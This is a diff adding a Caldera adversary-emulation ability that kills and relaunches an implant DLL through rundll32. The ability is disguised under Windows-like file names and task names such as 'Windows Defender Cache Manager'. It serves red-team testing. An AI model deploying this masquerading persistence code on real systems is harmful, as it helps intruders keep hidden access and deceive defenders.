@@ -1,0 +1,32 @@
+---
+
+- id: 4a100017-cafe-4001-8001-c0ffee000017
+  name: Restart Caldera agent via scheduled task
+  description: Kills the existing rundll32 agent process and restarts it via Win32_Process.Create. Auto-detects DC vs workstation to use the correct DLL path and task name.
+  tactic: execution
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $role = (Get-WmiObject Win32_ComputerSystem).DomainRole;
+          if ($role -in @(4,5)) {
+            $agentPath = 'C:\ProgramData\Microsoft\Windows\Caches\dfsr.dll';
+            $taskName  = 'DFS Replication Cache Maintenance';
+            $taskPath  = '\Microsoft\Windows\DFS\';
+          } else {
+            $agentPath = 'C:\ProgramData\Microsoft\Windows\Caches\RuntimeBroker.dll';
+            $taskName  = 'Windows Defender Cache Manager';
+            $taskPath  = '\Microsoft\Windows\Multimedia\';
+          }
+          Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*$agentPath*" } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue };
+          Start-Sleep -Seconds 2;
+          $cmd = "C:\Windows\System32\rundll32.exe `"$agentPath`",VoidFunc";
+          $result = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $cmd };
+          if ($result.ReturnValue -eq 0) {
+            Write-Host "[Agent] Restarted on $env:COMPUTERNAME (PID $($result.NewProcessId))"
+          } else {
+            Write-Host "[Agent] Failed to restart on $env:COMPUTERNAME (code $($result.ReturnValue))"
+          }
